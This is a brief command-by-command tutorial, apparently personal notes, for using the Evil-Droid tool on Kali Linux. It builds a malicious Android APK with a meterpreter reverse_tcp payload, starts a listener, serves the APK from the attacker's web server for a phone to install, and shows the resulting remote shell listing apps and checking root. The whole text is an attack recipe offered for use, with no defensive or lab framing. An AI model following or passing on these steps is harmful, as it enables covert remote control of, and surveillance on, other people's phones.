
## Download Evil Droid from github and Uses
	
	
	-> cd Desktop	
	
	-> git clone https://github.com/M4sc3r4n0/Evil-Droid
	
	-> cd Evil-Droid
	
	-> ls
	
	-> chmod +x evil-droid
	
	-> sudo ./evil-droid
	
	-> 1
	
	-> ok
	
	-> 5555
	
	-> ok
	
	-> evilapk
	
	-> ok
	
	-> select android/meterpreter/reverse_tcp 
	
	-> ok
	
	-> ok
	
	-> select multi/handler
	
	-> ok
	
	
	On Another Terminal
	
		-> cd /home/kali/Desktop
		
		-> cd Evil-Droid
		
		-> cd evilapk
		
		-> sudo mv evilapk /var/www/html
		
		
	On the Android Device
	
		-> Go to the browser and enter the ip address of the kali linux machine
		
	
	
	Got the meterpreter shell 
	
		-> app_list
		
		-> check_root
		
		